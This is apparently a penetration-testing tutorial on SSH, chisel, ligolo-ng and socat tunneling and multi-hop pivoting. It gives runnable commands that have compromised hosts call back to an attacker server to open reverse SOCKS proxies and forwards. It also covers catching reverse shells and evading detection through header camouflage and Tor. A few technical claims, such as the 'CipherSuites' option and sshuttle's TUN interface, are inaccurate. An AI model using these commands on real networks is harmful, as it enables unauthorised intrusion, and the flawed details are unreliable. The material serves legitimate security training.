# SSH and HTTP Tunneling with Pivoting

> Comprehensive guide to establishing SSH-based tunnels, HTTP/SOCKS tunnels, and multi-hop pivot chains for deep network traversal. Covers sshuttle, chisel, ligolo-ng, and socat for relay construction.

## Introduction and Objectives

Tunneling and pivoting are core techniques for network penetration testing, enabling access to isolated network segments that are not directly reachable from the attacker's position. This guide covers the primary tunneling tools available in Kali Linux, from simple SSH port forwarding to complex multi-hop pivot chains that traverse DMZ, internal, and restricted network zones.

**Learning objectives**:

- Establish transparent VPN-like network access using sshuttle for entire subnet routing
- Create targeted SSH port forwards (local, remote, dynamic/SOCKS) for specific services
- Deploy chisel for HTTP/SOCKS tunneling when SSH is blocked or monitored
- Use ligolo-ng for transparent Layer 3 pivoting with TUN interfaces
- Construct socat relay chains for ad-hoc protocol translation
- Build multi-hop pivot chains that combine multiple tunnel types for maximum reach

**Prerequisites**: SSH access to at least one pivot host on the target network. Understanding of TCP/IP networking, routing, and proxy concepts. Root access on the attacker machine (required for TUN/TAP interfaces).

## 1. Sshuttle -- Transparent VPN-like Access

Sshuttle provides the simplest path to transparent network access through an SSH pivot. Unlike per-application SOCKS proxies, sshuttle creates a TUN interface and routes entire subnets through SSH without requiring root access on the remote host.

**When to use sshuttle**: You have SSH access to a pivot host and need to run multiple unmodified tools against an internal network segment without configuring each tool individually for proxy support.

```bash
# Route entire internal subnet through SSH pivot
sshuttle -r user@pivot-host 192.168.0.0/16

# Route multiple subnets with DNS resolution through tunnel
sshuttle --dns -r user@pivot-host 10.0.0.0/8 172.16.0.0/12

# Exclude specific hosts to avoid routing conflicts
sshuttle -r user@pivot 10.0.0.0/8 -x 10.0.0.1 -x 10.0.0.254

# Use specific SSH key and port
sshuttle -r user@pivot:2222 --ssh-cmd "ssh -i ~/.ssh/pivot_key" 192.168.100.0/24
```

**Key advantages over SSH -D SOCKS proxy**: No per-application proxy configuration needed. All TCP traffic (and optionally DNS) for the target subnet is transparently routed. Works with tools that do not natively support SOCKS proxies (e.g., some database clients, proprietary protocols).

**Limitations**: Requires root on the local machine (creates TUN interface). Only routes TCP -- UDP traffic requires additional tunneling. Each sshuttle instance covers one SSH pivot; for multi-hop, chain multiple instances.

## 2. SSH Port Forwarding -- Targeted Relays

When sshuttle is overkill (you only need specific ports) or unavailable (no root on local machine), SSH port forwarding provides targeted relay tunnels.

```bash
# Local forward: expose internal service on local port
ssh -L 3306:db-internal:3306 user@pivot-host
# Now: mysql -h 127.0.0.1 connects to db-internal:3306 through pivot

# Remote forward: expose a local service to the remote network
ssh -R 8080:127.0.0.1:80 user@pivot-host
# Now: pivot-host:8080 reaches your local web server

# Dynamic forward (SOCKS proxy)
ssh -D 1080 user@pivot-host
# Now: proxychains4 curl http://internal-host routes through SOCKS

# Jump through multiple hosts with ProxyJump
ssh -J user@dmz-host user@internal-host
# Equivalent: ssh -o ProxyCommand="ssh -W %h:%p user@dmz-host" user@internal-host
```

**SSH tunnel hardening**: Add `ServerAliveInterval 60` and `ServerAliveCountMax 3` to keep tunnels alive through idle periods. Use `ExitOnForwardFailure yes` to prevent silent failures. Run with `-fN` for background operation.

## 3. Chisel -- HTTP/SOCKS Tunnel for Restricted Networks

When SSH is blocked or monitored, chisel tunnels TCP over HTTP, blending with normal web traffic. It supports both SOCKS5 proxy mode and reverse port forwarding.

```bash
# Server (attacker machine)
chisel server -p 8080 --reverse --socks5 --auth user:password

# Client (compromised host) -- reverse SOCKS proxy
chisel client --auth user:password http://attacker:8080 R:socks

# Client -- reverse port forward for specific service
chisel client http://attacker:8080 R:9090:10.10.10.50:3389
# Now attacker:9090 reaches 10.10.10.50:3389 through compromised host

# Client with custom headers to mimic legitimate traffic
chisel client http://attacker:8080 R:socks \
  --header "X-Forwarded-For: proxy.internal" \
  --header "User-Agent: Mozilla/5.0"
```

**Chisel architecture**: The server listens on the attacker-controlled host. The client runs on the compromised pivot and initiates an outbound HTTP connection. With `--reverse`, the server can request the client to create listeners. The SOCKS5 mode creates a proxy on the attacker machine that routes traffic through the client's network position.

**Detection evasion**: Chisel traffic looks like HTTP long-polling connections. Wrap it with stunnel (see socks-proxy-chain-traffic guide) for TLS encryption that defeats HTTP content inspection. Use non-standard ports (443, 8443, 8080) that are commonly associated with web services.

## 4. Ligolo-ng -- Transparent Pivoting with TUN Interface

Ligolo-ng creates a TUN interface on the attacker machine that routes traffic through a compromised agent via a TLS-encrypted control channel. It provides the most transparent pivoting experience -- similar to sshuttle but with a dedicated agent that does not require SSH on the target.

```bash
# Proxy (attacker machine)
./proxy -selfcert -laddr 0.0.0.0:9001

# Agent (compromised host)
./agent -connect attacker:9001 -ignore-cert

# In ligolo-ng proxy console:
# session_select 1        -- select the connected agent
# ifcreate --name pivot0  -- create TUN interface
# tunnel_start --name pivot0  -- start routing

# Route target subnet through TUN interface
sudo ip route add 192.168.50.0/24 dev pivot0

# Multi-hop: start a second ligolo-ng listener on the first agent's host
# Connect second agent through the first tunnel
```

**Ligolo-ng vs chisel**: Ligolo-ng provides Layer 3 access (entire subnet routing via TUN), while chisel provides Layer 4 access (SOCKS proxy for TCP). Ligolo-ng is more transparent but requires TUN/TAP capability on the attacker machine. Chisel is simpler to deploy when only specific ports are needed.

## 5. Socat -- Relay Chain Construction

Socat is the Swiss Army knife for building relay chains between any two endpoints. It supports TCP, UDP, SSL, SOCKS, and file descriptors, making it ideal for constructing ad-hoc relay chains.

```bash
# Simple TCP relay: forward port 8080 to internal service
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.50:80

# SSL relay: wrap internal HTTP in TLS
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:127.0.0.1:8080

# Chain through SOCKS proxy
socat TCP-LISTEN:9090,fork SOCKS5:127.0.0.1:target:80,socksport=1080

# UDP relay (for DNS forwarding)
socat UDP-LISTEN:5353,fork UDP:8.8.8.8:53
```

**Socat relay patterns**: Use `fork` to handle multiple concurrent connections. Add `reuseaddr` to allow quick restarts. Chain multiple socat instances to build multi-protocol relay paths. Use `SYSTEM:` to pipe traffic through shell commands for logging or transformation.

## 6. Multi-Hop Pivot Construction

Building a multi-hop pivot chain requires careful planning of tunnel types at each hop to maximize stealth and reliability.

```
Operator Workstation
    |
    v  [SSH SOCKS proxy :1080]
DMZ Host (first pivot)
    |
    v  [Chisel HTTP tunnel through SOCKS proxy]
Internal Host (second pivot)
    |
    v  [Ligolo-ng TUN interface]
Database Network (target segment)
```

**Step-by-step construction**:

1. Establish SSH SOCKS proxy to DMZ: `ssh -D 1080 -fN user@dmz-host`
2. Deploy chisel through SOCKS: `proxychains4 scp chisel internal-host:/tmp/`
3. Start chisel client on internal host, connecting back through DMZ
4. Configure second SOCKS proxy from chisel on port 1081
5. Deploy ligolo-ng agent on internal host
6. Connect ligolo-ng proxy through the chained SOCKS proxies
7. Route final target subnet through ligolo-ng TUN: `ip route add 10.10.20.0/24 dev tunnel0`

**Monitoring and maintenance**: Use `ServerAliveInterval` on SSH tunnels. Monitor chisel connection status. Keep ligolo-ng sessions alive with periodic heartbeat traffic. Document each hop's IP, port, and tunnel type for engagement reporting and cleanup.

## Hands-on Exercise: Multi-Hop Pivot Construction

Practice building a complete multi-hop pivot chain in a lab environment:

**Setup**:

```bash
# Create a lab with three network segments using VMs or containers
# Segment 1: Attacker network (192.168.1.0/24)
# Segment 2: DMZ (10.0.0.0/24) - accessible from attacker
# Segment 3: Internal (172.16.0.0/24) - only accessible from DMZ
```

**Exercise steps**:

1. Establish SSH SOCKS proxy to the DMZ host: `ssh -D 1080 user@dmz-host`
2. Verify access to DMZ services through the SOCKS proxy using proxychains
3. Deploy chisel to the internal host through the SOCKS proxy using `proxychains4 scp`
4. Start a chisel reverse SOCKS tunnel from the internal host through the DMZ
5. Configure proxychains to chain through both SOCKS proxies (DMZ then internal)
6. Verify access to the internal network segment (172.16.0.0/24) through the chained proxy
7. Optionally, deploy ligolo-ng for transparent subnet routing through the pivot chain
8. Document the complete pivot chain with IPs, ports, and tunnel types

**Validation criteria**: Successfully reach a host on the 172.16.0.0/24 segment from the attacker workstation. Run nmap through the complete proxy chain. Document the chain configuration for reporting.

## References and Resources

- **dns-icmp-covert-tunnel.md** -- For DNS and ICMP tunneling when TCP-based tunnels are blocked
- **socks-proxy-chain-traffic.md** -- For proxy chaining configuration and TLS wrapping of these tunnels
- **post-exploitation skill** -- For the broader lateral movement context where pivoting is used
- [sshuttle Documentation](https://github.com/sshuttle/sshuttle)
- [chisel GitHub Repository](https://github.com/jpillora/chisel)
- [ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [HackTricks - Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/pivoting)

---

## 7. Advanced SSH Tunneling Techniques

Beyond basic port forwarding, SSH provides several advanced tunneling capabilities that are essential for penetration testing operations.

### SSH Jump Host Chaining

```bash
# Chain through multiple jump hosts using ProxyJump (OpenSSH 7.3+)
ssh -J user1@dmz-host,user2@internal-host user3@deep-target

# Equivalent with older SSH versions using ProxyCommand
ssh -o ProxyCommand="ssh -W %h:%p user2@internal-host" user3@deep-target

# Persistent SSH tunnel with auto-reconnection
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
  -o "ExitOnForwardFailure yes" -D 1080 -fN user@pivot-host

# SSH multiplexing for tunnel performance
# Create a master connection that subsequent SSH sessions reuse
mkdir -p ~/.ssh/sockets
ssh -o "ControlMaster=auto" -o "ControlPath=~/.ssh/sockets/%r@%h:%p" \
  -o "ControlPersist=600" -D 1080 -fN user@pivot-host
# Subsequent connections through the same host reuse the master connection
ssh -o "ControlPath=~/.ssh/sockets/%r@%h:%p" user@pivot-host "hostname"
```

### SSH Tunnel Over Tor

```bash
# Route SSH tunnel through Tor for additional anonymity layer
# Requires Tor running locally with SOCKS proxy on 9050

# Method 1: Using ProxyCommand with torify
torify ssh -D 1080 -fN user@pivot-host

# Method 2: Using netcat as SOCKS proxy connector
ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:9050 %h %p" -D 1080 -fN user@pivot-host

# Note: SSH over Tor is significantly slower due to onion routing latency
# Use only when anonymity is more important than speed
```

### Reverse SSH Tunneling

When the target can make outbound connections but the attacker cannot reach the target directly, reverse SSH tunnels provide inbound access through an outbound connection.

```bash
# On the target: establish reverse tunnel to attacker
ssh -R 2222:localhost:22 -R 8080:localhost:80 -fN attacker@attacker-server

# On the attacker: connect to target through the reverse tunnel
ssh -p 2222 target-user@localhost

# Reverse SOCKS proxy through SSH (pivot through target's network)
# On the target:
ssh -R 1080 attacker@attacker-server
# On the attacker, localhost:1080 is now a SOCKS proxy routing through target's network

# Reverse tunnel with GatewayPorts for shared access
ssh -R 0.0.0.0:2222:localhost:22 -o GatewayPorts=yes -fN attacker@attacker-server
# Now anyone who can reach attacker-server:2222 can connect to the target
```

## 8. Chisel Advanced Techniques

### Chisel with SOCKS5 Authentication

```bash
# Server with authentication and SOCKS5
chisel server -p 8080 --reverse --socks5 --auth "operator:SecretPass123"

# Client connecting with authentication
chisel client --auth "operator:SecretPass123" http://attacker:8080 R:socks

# Multiple reverse port forwards in a single client connection
chisel client http://attacker:8080 \
  R:2222:10.10.10.5:22 \
  R:3389:10.10.10.100:3389 \
  R:8080:10.10.10.50:80 \
  R:socks

# Chisel with custom HTTP headers for traffic camouflage
chisel client http://attacker:8080 R:socks \
  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --header "X-Forwarded-For: 10.0.0.1" \
  --header "Accept: text/html,application/xhtml+xml"
```

### Chisel Through HTTP Proxy

```bash
# When a corporate HTTP proxy blocks direct connections to the chisel server
# Configure the client to connect through the proxy

# Method 1: Set HTTP_PROXY environment variable
export HTTP_PROXY=http://proxy.corp.local:8080
chisel client http://attacker-server:443 R:socks

# Method 2: Use stunnel to wrap chisel traffic in TLS first
# On the server: stunnel accepts TLS on 443, forwards to chisel on 8080
# On the client: stunnel connects through proxy to server:443, exposes local port
cat > /etc/stunnel/chisel-client.conf << 'EOF'
client = yes
[chisel]
accept = 127.0.0.1:9090
connect = attacker-server:443
EOF
stunnel /etc/stunnel/chisel-client.conf
# Now connect chisel through local stunnel
chisel client http://127.0.0.1:9090 R:socks
```

## 9. Ligolo-ng Advanced Pivoting

### Multi-Agent Management

Ligolo-ng supports multiple connected agents, each providing access to different network segments. Managing multiple agents effectively is key for complex engagements.

```bash
# Start ligolo-ng proxy
./proxy -selfcert -laddr 0.0.0.0:9001

# Multiple agents can connect to the same proxy
# Agent 1: DMZ host
./agent -connect attacker:9001 -ignore-cert

# Agent 2: Internal host (deployed through first tunnel)
./agent -connect attacker:9001 -ignore-cert

# In the proxy console:
# List all connected sessions
ligolo-ng » session
# Session 1 - dmz-host (10.0.0.5) - connected
# Session 2 - internal-host (10.10.0.10) - connected

# Route traffic through specific agent
ligolo-ng » session_select 1
ligolo-ng » ifcreate --name dmz_tun
ligolo-ng » tunnel_start --name dmz_tun
sudo ip route add 10.0.0.0/24 dev dmz_tun

# Switch to second agent for internal network
ligolo-ng » session_select 2
ligolo-ng » ifcreate --name internal_tun
ligolo-ng » tunnel_start --name internal_tun
sudo ip route add 10.10.0.0/16 dev internal_tun

# Now both network segments are accessible simultaneously
nmap -sT -Pn 10.0.0.0/24  # routes through dmz_tun
nmap -sT -Pn 10.10.0.0/24  # routes through internal_tun
```

### Ligolo-ng with Listener Binding

```bash
# Bind a local listener on the agent side for reverse shell capture
# In ligolo-ng proxy console:
ligolo-ng » session_select 1
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Now when a target connects to 10.0.0.5:4444, it is forwarded to your local port 4444
# This allows catching reverse shells through the ligolo-ng tunnel without additional port forwarding
nc -lvnp 4444  # Local listener catches connections from agent's network
```

## 10. Tunnel Reliability and Monitoring

### Automated Tunnel Recovery

```bash
# Comprehensive tunnel health check script
cat > tunnel_health.sh << 'SCRIPT'
#!/bin/bash

check_chisel() {
  if ! pgrep -f "chisel client" >/dev/null; then
    echo "[$(date)] Chisel client not running. Restarting..."
    chisel client http://server:8080 R:socks &
    return 1
  fi
  return 0
}

check_socks() {
  if ! curl -s --connect-timeout 5 --socks5 127.0.0.1:1080 http://10.0.0.1 >/dev/null 2>&1; then
    echo "[$(date)] SOCKS proxy not responding. Cycling tunnel..."
    pkill -f "chisel client"
    sleep 3
    chisel client http://server:8080 R:socks &
    return 1
  fi
  return 0
}

check_ssh() {
  if ! ssh -o ConnectTimeout=5 -o BatchMode=yes pivot-host "echo alive" >/dev/null 2>&1; then
    echo "[$(date)] SSH tunnel unreachable. Reconnecting..."
    autossh -M 0 -o "ServerAliveInterval 30" -D 1080 -fN user@pivot-host
    return 1
  fi
  return 0
}

check_chisel
check_socks
check_ssh
SCRIPT
chmod +x tunnel_health.sh
```

### Tunnel Throughput Optimization

```bash
# Measure tunnel throughput
iperf3 -c localhost -p 5201 --connect-timeout 5000
# Run through proxychains to measure tunneled throughput
proxychains4 iperf3 -c internal-host -p 5201

# Optimize SSH tunnel performance
ssh -D 1080 -fN -o "Compression=yes" -o "CipherSuites=aes128-gcm@openssh.com" \
  -o "ServerAliveInterval=60" user@pivot-host

# Adjust MTU for tunnel interfaces
sudo ip link set dev tun0 mtu 1400
# Lower MTU reduces fragmentation which improves reliability through tunnels
```
